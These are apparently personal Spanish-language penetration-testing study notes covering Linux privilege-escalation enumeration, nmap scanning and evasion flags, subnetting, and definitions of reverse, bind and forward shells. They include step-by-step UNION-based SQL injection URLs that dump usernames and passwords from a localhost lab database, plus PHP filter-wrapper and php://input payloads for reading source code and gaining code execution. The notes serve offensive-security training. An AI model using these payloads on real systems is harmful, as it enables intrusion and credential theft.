	
comando 2>/dev/null -> redirigir errores a dev null para que no salgan en consola
comando &>/dev/null -> no mostrar errores ni resultado exitosos


lsattr -> listar permisos avanzados
chattr +i  -> agrega inmutabilidad a un archivo

find / -type f -perm -4000 -> buscar archivos con SUID
find / -perm -2000 -> mismo que SUID pero para grupos (SGID grupo root)

getcap -r / -> listar capabilities

find / -name nombrearchivo
find / -group nombregrupo -type f (f-> file o d->directory)
find / -user root -writable (writable - executable - readable)
find / -name dex\*.sh -> devuelve todo lo que empieza por dex y es .sh

| Servidor Web | Webroot predeterminado |
| ------------ | ---------------------- |
| `Apache`     | /var/www/html/         |
| `Nginx`      | /usr/local/nginx/html/ |
| `IIS`        | c:\inetpub\wwwroot\|   |
| `XAMPP`      | C:\xampp\htdocs\|      |

-------------------
Descubrimiento de host
nmap -sn 192.168.100.0/24
arp-scan -I tun0 --localnet 


-----
Subnetting
 10.18.51.23/23
  00001010.00010010.00110011.00010111 (10.18.51.23)
  11111111.11111111.11111110.00000000 (255.255.254.0 - mascara subred) -> 23 bits en 1
  -----------------------------------------------------
  00001010.00010010.00110010.00000000 (AND)(10.18.50.0 - first ip) -> 1 si son ambos 1
  00001010.00010010.00110011.11111111 (10.18.51.255) (32-23=9, 23 iguales y 9 a 1)
  [23 bits iguales a la ip base y todo lo demas se deja en 1]

-----------------------
Nmap
--mtu -> ajusta el tamaño de paquete a uno establecido manualmente multiplo de 8
-data-length -> modifica largo del paquete, tambien sigilo
-source-port -> modifica manualmente el puerto local
-D -> simular que scan se hizo con otra ip
-f -> fragmenta el paquete
-spoof-mac -> cambia mac a otra establecida


------
- **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
- **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
- **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

----------
- **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
- **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.


------
**sqlinjection**

1.- determinar la cantidad de columnas que devuelve la query original (hay que jugar con el 100 para encontrar la cantidad que corresponde)
	http://localhost/searchUsers.php?id=1%27%20order%20by%201--%20-   //  Users.php?id=1' order by 1-- -
2.- teniendo el paso anterior, se puede empezar a agregar campos extras (se debe usar id de algo que no exista)
	http://localhost/searchUsers.php?id=4%27%20union%20select%20%27NULL%27--%20- // Users.php?id=4' union select 'NULL'-- -
3.- listar todas las bases de datos existentes
	http://localhost/searchUsers.php?id=4%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--%20- 
	// Users.php?id=4' union select group_concat(schema_name) from information_schema.schemata-- -
4.- listar las tablas de una base de datos especifica, obtenida del paso anterior
	http://localhost/searchUsers.php?id=4%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27hack4u%27--%20-
	// Users.php?id=4' union select group_concat(table_name) from information_schema.tables where table_schema='hack4u'-- -
5.- listar las columnas de la tabla del paso anterior
	http://localhost/searchUsers.php?id=4%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27hack4u%27%20and%20table_name=%27users%27--%20-
	// Users.php?id=4' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -
6.- obtengo los datos de las tablas (si es sobre la misma base de datos que se esta ejecutando, no hace falta poner el hack4u antes del nombre de la tabla (formato bd.tabla))
	http://localhost/searchUsers.php?id=4%27%20union%20select%20group_concat(username,%27:%27,password)%20from%20hack4u.users--%20-
	// Users.php?id=4' union select group_concat(username,':',password) from hack4u.users-- -
	// Users.php?id=4' union select group_concat(username,0x34a,password) from hack4u.users-- - (se recomienda evitar comillas y cosas especiales, por lo que es mejor ponerlo en hexadecimal)

para casos en que no devuelve errores, se puede hacer misma logica anterior, pero interpretando desde un resultado hasta que no devuelve nada (ultimo valor mostrado seria el ultimo valido)

*sqlinjection condicionales*
**para casos en que no hay respuestas erroneas ni correctas por web, puede darse el caso que mediante cabeceras de alguna info, para ello se usa curl
	curl -s -X GET "http://localhost/searchUsers.php?=id=1" -I ( i mayuscula)



---------
RFI
la utilización de wrappers permite ver el codigo fuente de archivos php por ejemplo. 
// el wrapper seria la parte de php://filter/conver.base64-encode/resource
http://localhost/?filename=php://filter/convert.base64-encode/resource=secret.php

// otro ejemplo php://filter/read=string.rout13/resource=secret.php, rota el codigo fuente 13 caracteres, permitiendo ver codigo fuente.
![[Pasted image 20251211060715.png]]

//otro ejemplo cambiando encoding php://filter/convert.iconv.utf-8.utf-16/resource=secret.php
![[Pasted image 20251211061200.png]] 

// usando php://input permitiria realizar RCE. hay q cambiar de GET a POST (click secundario en burp te da una opcion de cambio)
![[Pasted image 20251211063032.png]]

